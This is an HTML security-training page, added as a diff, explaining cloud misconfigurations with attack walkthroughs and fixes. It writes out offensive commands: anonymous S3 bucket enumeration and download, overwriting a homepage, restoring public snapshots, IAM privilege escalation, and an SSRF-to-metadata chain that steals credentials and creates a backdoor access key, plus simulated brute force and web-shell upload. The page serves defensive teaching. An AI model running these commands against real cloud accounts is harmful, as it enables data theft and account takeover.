@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Cloud Misconfigurations</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:8px 10px;font-weight:500;color:#888;border-bottom:1px solid #2a2a30}
+td{padding:8px 10px;border-bottom:1px solid #1e1e26;vertical-align:top}
+tr:last-child td{border-bottom:none}
+</style>
+</head>
+<body>
+<h1>Cloud Misconfigurations</h1>
+<p class="sub">OWASP A05 · The #1 cause of cloud data breaches — exposed S3 buckets, overprivileged IAM, public snapshots, metadata abuse</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('overview',this)">Overview</button>
+  <button class="tab-btn" onclick="showTab('s3',this)">S3 &amp; Storage</button>
+  <button class="tab-btn" onclick="showTab('iam',this)">IAM &amp; Permissions</button>
+  <button class="tab-btn" onclick="showTab('meta',this)">Metadata &amp; SSRF</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- OVERVIEW -->
+<div class="tab-panel active" id="tab-overview">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Cloud misconfigurations are the leading cause of data breaches — not sophisticated zero-days, but simple mistakes: a bucket left public, a role with <code style="font-family:'Courier New',monospace;font-size:11px">*:*</code> permissions, a database open to the internet. The shared responsibility model means <em>you</em> configure security — and cloud defaults are often dangerously permissive.</p>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;margin-bottom:12px;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:10px;">Shared Responsibility — the misconfiguration zone</div>
+    <div class="grid2">
+      <div style="background:#0d1f3a;border-radius:6px;padding:10px 12px;border:1px solid #1a3a60;">
+        <div style="font-size:11px;font-weight:600;color:#60a5fa;margin-bottom:4px;">Cloud provider secures</div>
+        <div style="font-size:11px;color:#888;">Physical hardware, hypervisor, network fabric, data center security, managed service runtime</div>
+      </div>
+      <div style="background:#2a1010;border-radius:6px;padding:10px 12px;border:1px solid #5a2020;">
+        <div style="font-size:11px;font-weight:600;color:#f87171;margin-bottom:4px;">YOU secure (where breaches happen)</div>
+        <div style="font-size:11px;color:#888;">IAM policies, bucket ACLs, security groups, encryption settings, network ACLs, OS patching, secret management</div>
+      </div>
+    </div>
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:8px;">
+    <div class="sc-card sc-red"><div style="font-size:12px;font-weight:600;color:#f87171;margin-bottom:3px;">Public S3 buckets</div><div style="font-size:11px;color:#888;">Open ACL / bucket policy allows world read — PII, backups, source code exposed</div></div>
+    <div class="sc-card sc-red"><div style="font-size:12px;font-weight:600;color:#f87171;margin-bottom:3px;">Overprivileged IAM</div><div style="font-size:11px;color:#888;">Action:* Resource:* on EC2 roles — full account takeover if instance is compromised</div></div>
+    <div class="sc-card sc-amber"><div style="font-size:12px;font-weight:600;color:#fbbf24;margin-bottom:3px;">Public snapshots</div><div style="font-size:11px;color:#888;">EBS / RDS snapshots shared publicly — mount to own account, read all data</div></div>
+    <div class="sc-card sc-amber"><div style="font-size:12px;font-weight:600;color:#fbbf24;margin-bottom:3px;">Open security groups</div><div style="font-size:11px;color:#888;">0.0.0.0/0 on SSH (22), RDP (3389), or database ports — brute force, direct access</div></div>
+    <div class="sc-card sc-purple"><div style="font-size:12px;font-weight:600;color:#c084fc;margin-bottom:3px;">Metadata SSRF</div><div style="font-size:11px;color:#888;">SSRF + 169.254.169.254 = IAM credential theft → full account access</div></div>
+    <div class="sc-card sc-blue"><div style="font-size:12px;font-weight:600;color:#60a5fa;margin-bottom:3px;">Hardcoded secrets</div><div style="font-size:11px;color:#888;">AWS keys in GitHub, Docker images, Lambda env vars, CloudFormation templates</div></div>
+  </div>
+</div>
+
+<!-- S3 -->
+<div class="tab-panel" id="tab-s3">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Public S3 buckets have exposed billions of records. They are trivially discoverable by guessing names and require no authentication to access when misconfigured.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Finding and enumerating public buckets</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code"># Guess bucket names based on company
+aws s3 ls s3://corp-backup --no-sign-request
+aws s3 ls s3://corp-prod-data --no-sign-request
+aws s3 ls s3://corp.com-assets --no-sign-request
+
+# Automated discovery
+python3 s3scanner.py --bucket corp-backup
+# S3 URL patterns to try:
+# https://BUCKET.s3.amazonaws.com/
+# https://s3.amazonaws.com/BUCKET/
+# https://BUCKET.s3.REGION.amazonaws.com/
+
+# Google dorks
+# site:s3.amazonaws.com "corp"
+# site:s3.amazonaws.com inurl:backup OR inurl:database
+
+# Once found — enumerate and download
+aws s3 ls s3://corp-backup --no-sign-request --recursive
+aws s3 sync s3://corp-backup . --no-sign-request
+# Look for: .env, *.sql, *.pem, config.json, *.bak, *.key</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">S3 misconfiguration variants</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code"># 1. Public read — everyone can list + download
+Bucket ACL: public-read OR Block Public Access: OFF
+Policy: Principal:"*", Action:"s3:GetObject"
+
+# 2. Public WRITE — anyone can overwrite files!
+Bucket ACL: public-read-write
+aws s3 cp evil.html s3://corp-site/index.html --no-sign-request
+# → homepage replaced, scripts injected
+
+# 3. Authenticated read — ANY AWS account can access
+Bucket ACL: authenticated-read
+# Not "private" — millions of people have AWS accounts
+
+# 4. Signed URL leakage
+# Pre-signed URLs with long expiry (days/weeks) shared publicly
+# Leaked in logs, browser history, GitHub → still valid</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Public EBS and RDS snapshots</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># Find public EBS snapshots for an account
+aws ec2 describe-snapshots \
+  --filters "Name=owner-id,Values=TARGET_ACCOUNT_ID" \
+  --query "Snapshots[?Public==\`true\`]"
+
+# Restore to your own account and mount
+aws ec2 create-volume --snapshot-id snap-XXXXXXXX \
+  --availability-zone us-east-1a --region us-east-1
+# Mount → read entire disk: app code, .env, /etc/passwd, DB files
+
+# Find public RDS snapshots
+aws rds describe-db-snapshots --include-public \
+  --snapshot-type public
+# Restore to own RDS → full database access, credentials, PII</div>
+  </div>
+</div>
+
+<!-- IAM -->
+<div class="tab-panel" id="tab-iam">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">IAM misconfigurations are the most dangerous cloud issues. A single overprivileged role gives an attacker full account control after any initial foothold.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Overprivileged roles — common patterns</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code"># The worst offender: AdministratorAccess on EC2 instance role
+{ "Effect":"Allow", "Action":"*", "Resource":"*" }
+# Compromise this EC2 via SSRF/RCE → full AWS account takeover
+
+# Common over-broad permissions found in real environments:
+Action: "s3:*"              # read/write/delete ALL buckets
+Action: "iam:*"             # create admin users, escalate privileges
+Action: "iam:PassRole"      # pass any role to services → privesc
+Action: "ec2:*"             # launch instances with new roles
+Action: "lambda:*"          # deploy backdoor functions
+Action: "sts:AssumeRole"    # assume any role in account
+
+# IAM privilege escalation paths:
+# iam:CreatePolicyVersion    → create policy version with *:*
+# iam:AttachUserPolicy       → attach AdminAccess to self
+# iam:CreateAccessKey        → create persistent keys for any user
+# iam:PassRole + ec2:RunInstances → launch EC2 with admin role</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Enumerating IAM after initial access</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code"># Identify current identity
+aws sts get-caller-identity
+
+# List attached policies
+aws iam list-attached-user-policies --user-name USERNAME
+aws iam list-attached-role-policies --role-name ROLENAME
+aws iam get-policy-version --policy-arn ARN --version-id v1
+
+# Automated enumeration — tests 300+ API calls
+python3 enumerate-iam.py --access-key AKIA... --secret-key ...
+
+# Pacu — AWS exploitation framework
+python3 pacu.py
+# Useful modules:
+# iam__enum_permissions    → what can I do?
+# iam__privesc_scan        → find escalation paths
+# s3__bucket_finder        → enumerate all buckets
+# lambda__backdoor_all_functions → persist access</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Hardcoded credentials</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># GitHub search (passive recon)
+# site:github.com "AKIA" "aws_secret_access_key"
+# site:github.com "corp.com" ".env"
+# filename:.env DB_PASSWORD
+
+# Automated secret scanning
+trufflehog git https://github.com/corp/app --only-verified
+gitleaks detect --source . --report-path leaks.json
+
+# Check if a leaked key still works
+aws sts get-caller-identity --profile leaked
+
+# Common leak locations:
+# .env files committed to git
+# Docker image layers (docker history)
+# Lambda environment variables (if function is public)
+# CloudFormation templates stored in S3
+# EC2 user-data (visible in AWS console to anyone with EC2:Describe)</div>
+  </div>
+</div>
+
+<!-- METADATA -->
+<div class="tab-panel" id="tab-meta">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">The instance metadata service is the jackpot of SSRF — reachable only from within the cloud instance, it returns temporary IAM credentials giving attacker-level access to the entire account.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Full chain: SSRF → metadata → account takeover</div>
+    <div class="code"># Step 1: Find SSRF in web app
+GET /fetch?url=http://169.254.169.254/latest/meta-data/
+
+# Step 2: Get IAM role name
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns: "ec2-prod-role"
+
+# Step 3: Get temporary credentials
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
+# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
+
+# Step 4: Use from attacker machine
+export AWS_ACCESS_KEY_ID=ASIAXYZ123456
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
+export AWS_SESSION_TOKEN=AQoXnyc4...
+
+# Step 5: Escalate
+aws sts get-caller-identity
+aws s3 ls                           # all buckets
+aws secretsmanager list-secrets     # DB passwords, API keys
+aws ec2 describe-instances          # entire infrastructure map
+aws iam create-access-key --user-name admin  # persistent backdoor</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Metadata endpoints by cloud provider</div>
+    <div class="code"># AWS EC2 (IMDSv1 — no token needed)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data          # bootstrap scripts, passwords
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
+
+# AWS EC2 (IMDSv2 — requires PUT token first)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/
+
+# GCP (requires Metadata-Flavor: Google header)
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+# Azure (requires Metadata: true header)
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
+
+# ECS containers (task credentials)
+http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</div>
+  </div>
+</div>
+
+<!-- LIVE DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate checking common cloud misconfiguration scenarios. Select a test to see what an attacker discovers and what a hardened configuration returns.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">Misconfiguration to test</div>
+    <select id="test-select" onchange="runTest()" style="width:100%;font-family:system-ui;">
+      <option value="s3_public">Public S3 bucket — open read</option>
+      <option value="s3_write">S3 bucket — public write</option>
+      <option value="metadata">EC2 metadata — IAM cred theft (IMDSv1)</option>
+      <option value="sg_open">Security group — SSH open to world</option>
+      <option value="snapshot">Public EBS snapshot</option>
+      <option value="hardcoded">Hardcoded AWS key in GitHub</option>
+    </select>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#f87171;">Misconfigured environment</div>
+      <div class="mono-out" id="vuln-out"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#4ade80;">Hardened environment</div>
+      <div class="mono-out" id="safe-out"></div>
+    </div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">① S3 — enable Block Public Access on every bucket <span class="badge b-red">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Enable at both the account level and individual bucket level. This overrides any bucket ACL or policy that grants public access.</div>
+    <div class="code"># Enable at account level (covers all buckets)
+aws s3control put-public-access-block \
+  --account-id 123456789012 \
+  --public-access-block-configuration \
+    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
+
+# Audit — find any buckets that allow public access
+aws s3api list-buckets --query "Buckets[].Name" --output text | \
+  xargs -I{} aws s3api get-bucket-acl --bucket {} 2>/dev/null</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">② IAM — enforce least privilege, use SCPs <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Never use <code style="font-family:'Courier New',monospace;font-size:11px">*:*</code>. Grant only the specific actions on specific resources a role needs. Use Service Control Policies (SCPs) in AWS Organizations to enforce guardrails account-wide.</div>
+    <div class="code"># Bad: overprivileged
+{ "Effect":"Allow", "Action":"*", "Resource":"*" }
+
+# Good: least privilege
+{ "Effect":"Allow",
+  "Action": ["s3:GetObject","s3:PutObject"],
+  "Resource": "arn:aws:s3:::my-app-bucket/*" }
+
+# SCP to deny dangerous actions org-wide
+{ "Effect":"Deny",
+  "Action": ["iam:CreateUser","iam:CreateAccessKey","ec2:*"],
+  "Resource":"*",
+  "Condition":{"StringNotEquals":{"aws:PrincipalArn":"arn:aws:iam::*:role/BreakGlass"}} }
+
+# Automated policy analysis
+pip install cloudsplaining
+cloudsplaining scan-policy-file --input policy.json</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">③ Enforce IMDSv2 — block credential theft via SSRF <span class="badge b-green">Critical for EC2</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">IMDSv2 requires a PUT request with a session token before any metadata can be read. SSRF via GET cannot obtain credentials — it would need to make a PUT first, which many SSRF vectors cannot do.</div>
+    <div class="code"># Enforce IMDSv2 on existing instances
+aws ec2 modify-instance-metadata-options \
+  --instance-id i-1234567890abcdef0 \
+  --http-tokens required \
+  --http-endpoint enabled
+
+# Enforce in launch template / Terraform
+resource "aws_launch_template" "app" {
+  metadata_options {
+    http_tokens   = "required"   # IMDSv2 only
+    http_endpoint = "enabled"
+  }
+}
+
+# SCP to prevent IMDSv1 instances from launching
+{ "Effect":"Deny", "Action":"ec2:RunInstances",
+  "Condition":{"StringNotEquals":
+    {"ec2:MetadataHttpTokens":"required"}} }</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">④ Enable CloudTrail + GuardDuty + AWS Config <span class="badge b-amber">Detection</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Logging and detection don't prevent misconfigs but catch exploitation in progress. GuardDuty specifically detects metadata credential abuse, unusual API calls, and compromised EC2 instances.</div>
+    <div class="code"># Enable CloudTrail in all regions
+aws cloudtrail create-trail --name org-trail \
+  --s3-bucket-name my-cloudtrail-bucket \
+  --is-multi-region-trail --include-global-service-events
+
+# Enable GuardDuty (detects metadata abuse, credential theft)
+aws guardduty create-detector --enable
+
+# AWS Config — detect non-compliant resources
+# Managed rules to enable:
+# s3-bucket-public-read-prohibited
+# iam-root-access-key-check
+# ec2-imdsv2-check
+# restricted-ssh
+# rds-instance-public-access-check</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">⑤ Continuous posture management checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Run Prowler / ScoutSuite weekly for automated misconfiguration scanning &nbsp;·&nbsp;
+      Never use root account — enable MFA, create admin IAM user instead &nbsp;·&nbsp;
+      Rotate all IAM access keys every 90 days &nbsp;·&nbsp;
+      Delete unused IAM users, roles, and access keys immediately &nbsp;·&nbsp;
+      Enable encryption at rest (KMS) for all S3, EBS, RDS, Secrets Manager &nbsp;·&nbsp;
+      Security groups: no 0.0.0.0/0 on port 22, 3389, or database ports &nbsp;·&nbsp;
+      Use Secrets Manager / Parameter Store — never hardcode credentials &nbsp;·&nbsp;
+      Enable versioning + MFA delete on S3 buckets containing sensitive data
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const TESTS={
+  s3_public:{
+    vuln:`$ aws s3 ls s3://corp-backup --no-sign-request
+
+2026-01-12 09:14:22   45234 database_prod.sql
+2026-01-15 14:22:11    3421 .env
+2026-02-01 08:00:00  182340 customer_data.csv
+2026-02-20 11:30:45    1240 config.json
+2026-03-01 09:45:00    8821 api_keys.txt
+
+$ aws s3 cp s3://corp-backup/.env . --no-sign-request
+$ cat .env
+DB_HOST=prod-db.corp.com
+DB_PASSWORD=Sup3rS3cr3t!
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET=wJalrXUtnFEMI...
+STRIPE_SECRET=sk_live_xK9mP2...`,
+    safe:`$ aws s3 ls s3://corp-backup --no-sign-request
+
+An error occurred (AccessDenied): Access Denied
+
+Block Public Access: ENABLED
+  BlockPublicAcls:       true
+  IgnorePublicAcls:      true
+  BlockPublicPolicy:     true
+  RestrictPublicBuckets: true
+
+No unauthenticated access permitted.`,
+    verdict:'<strong>Critical: public S3 bucket!</strong> The misconfigured bucket exposes a production database dump, .env file with credentials, customer CSV, and API keys — all downloadable with no authentication. Block Public Access eliminates this at the account level.'
+  },
+  s3_write:{
+    vuln:`$ aws s3 cp malware.html s3://corp-site/index.html --no-sign-request
+upload: ./malware.html to s3://corp-site/index.html
+
+# Corp's homepage is now replaced with attacker content!
+# Used for: phishing, malware distribution, SEO spam
+
+$ aws s3 cp backdoor.php s3://corp-site/uploads/ --no-sign-request
+upload: ./backdoor.php to s3://corp-site/uploads/backdoor.php
+# Web shell uploaded if S3 content is executed`,
+    safe:`$ aws s3 cp malware.html s3://corp-site/index.html --no-sign-request
+
+An error occurred (AccessDenied): Access Denied
+
+Bucket policy denies all s3:PutObject from
+Principal: "*" (public).
+
+Only authorized IAM roles can write to this bucket.`,
+    verdict:'<strong>Critical: public write access!</strong> The attacker overwrote the homepage and uploaded a web shell. With a public-read-write ACL, any anonymous user can modify or delete any file in the bucket.'
+  },
+  metadata:{
+    vuln:`$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+ec2-prod-role
+
+$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
+{
+  "Code":            "Success",
+  "AccessKeyId":     "ASIAXYZ123456EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfi",
+  "Token":           "AQoXnyc4lcK4wMsJQXVwgJ0...",
+  "Expiration":      "2026-03-28T09:00:00Z"
+}
+
+# Now use from attacker machine:
+$ aws s3 ls --profile stolen
+2026-01-01  corp-prod-data
+2026-01-01  corp-backups
+2026-01-01  corp-logs
+$ aws secretsmanager get-secret-value --secret-id prod/db/password`,
+    safe:`$ curl http://169.254.169.254/latest/meta-data/ \
+  -H "X-aws-ec2-metadata-token: REQUIRED"
+
+401 Unauthorized
+{
+  "message": "IMDSv2 required. PUT /latest/api/token first.",
+  "code": "InvalidToken"
+}
+
+# SSRF via GET cannot obtain a PUT token
+# Metadata credential theft blocked by IMDSv2`,
+    verdict:'<strong>Critical: IMDSv1 metadata credential theft!</strong> A GET-based SSRF vulnerability reaches the metadata endpoint and returns temporary AWS IAM credentials — giving the attacker full access to the cloud account. IMDSv2 blocks this by requiring a PUT request with a header that simple SSRF vectors cannot send.'
+  },
+  sg_open:{
+    vuln:`$ nmap -p 22 54.12.34.56
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Security Group: launch-wizard-1
+  Inbound: port 22, source 0.0.0.0/0 (WORLD)
+
+# Brute force possible:
+$ hydra -l ubuntu -P rockyou.txt ssh://54.12.34.56
+[22][ssh] host: 54.12.34.56   login: ubuntu   password: ubuntu1234
+
+# Direct shell access:
+$ ssh ubuntu@54.12.34.56`,
+    safe:`$ nmap -p 22 54.12.34.56
+PORT   STATE    SERVICE
+22/tcp filtered ssh
+
+Security Group:
+  Inbound: port 22, source 10.0.0.0/8 (VPC only)
+  Inbound: port 22, source 203.0.113.50/32 (bastion only)
+  No public SSH access.
+
+Use: AWS SSM Session Manager for shell access
+     (no inbound ports needed at all)`,
+    verdict:'<strong>High: SSH open to the world (0.0.0.0/0)!</strong> The instance is directly brute-forceable from the internet. Weak passwords or leaked keys give instant shell access. The hardened config restricts SSH to internal VPC CIDR only — or better, uses SSM Session Manager which requires zero open inbound ports.'
+  },
+  snapshot:{
+    vuln:`$ aws ec2 describe-snapshots \
+  --filters Name=owner-id,Values=123456789012 \
+  --query "Snapshots[?Public==\`true\`].[SnapshotId,Description]"
+
+snap-0abc123def456  "prod-db-backup-2026-01-15"
+snap-0def789abc012  "web-server-ami-2026-02-01"
+
+# Restore and mount to own account:
+$ aws ec2 create-volume --snapshot-id snap-0abc123def456 \
+    --availability-zone us-east-1a
+# Mount → access: database files, .env, app source code, /etc/shadow`,
+    safe:`$ aws ec2 describe-snapshots \
+  --filters Name=owner-id,Values=123456789012 \
+  --query "Snapshots[?Public==\`true\`]"
+
+[]
+
+All snapshots have RestorableBy set to specific account IDs only.
+No public snapshots found.
+
+AWS Config rule: ec2-snapshot-public-restorable-check
+Status: COMPLIANT`,
+    verdict:'<strong>High: public EBS snapshots!</strong> Production database backup and web server snapshots are visible and restorable by any AWS account. An attacker restores them to their own account, mounts the volumes, and reads all data — database contents, application code, credentials, SSH keys.'
+  },
+  hardcoded:{
+    vuln:`# GitHub search: "AKIA" "aws_secret_access_key" site:github.com
+
+# Found in corp/app commit a3f1b2c (3 months ago):
+# config/deploy.rb line 14:
+AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+
+# Key still valid:
+$ aws sts get-caller-identity --profile leaked
+{
+  "Account": "123456789012",
+  "Arn": "arn:aws:iam::123456789012:user/deploy-user"
+}
+# deploy-user has: S3:*, EC2:Describe*, RDS:*`,
+    safe:`# truffleHog pre-commit hook blocked commit:
+
+CRITICAL: AWS Access Key detected in config/deploy.rb
+Pattern: AKIA[0-9A-Z]{16}
+
+Commit rejected. Use AWS Secrets Manager instead:
+  import boto3
+  secret = boto3.client('secretsmanager')\
+    .get_secret_value(SecretId='prod/deploy/aws-key')
+
+GitLeaks config active. All commits scanned.
+AWS key pattern: blocked before reaching remote.`,
+    verdict:'<strong>High: hardcoded AWS credentials in git!</strong> The key was committed 3 months ago and is still valid. Even after deletion from the current branch, it remains in git history forever. Use AWS Secrets Manager or environment variables injected at deploy time — never commit credentials.'
+  }
+};
+
+function runTest(){
+  const key=document.getElementById('test-select').value;
+  const t=TESTS[key];
+  document.getElementById('vuln-out').innerHTML=`<span style="color:#f87171">${t.vuln}</span>`;
+  document.getElementById('safe-out').innerHTML=`<span style="color:#4ade80">${t.safe}</span>`;
+  const v=document.getElementById('verdict');
+  v.className='result-box r-red';
+  v.innerHTML=t.verdict;
+}
+runTest();
+</script>
+</body>
+</html>
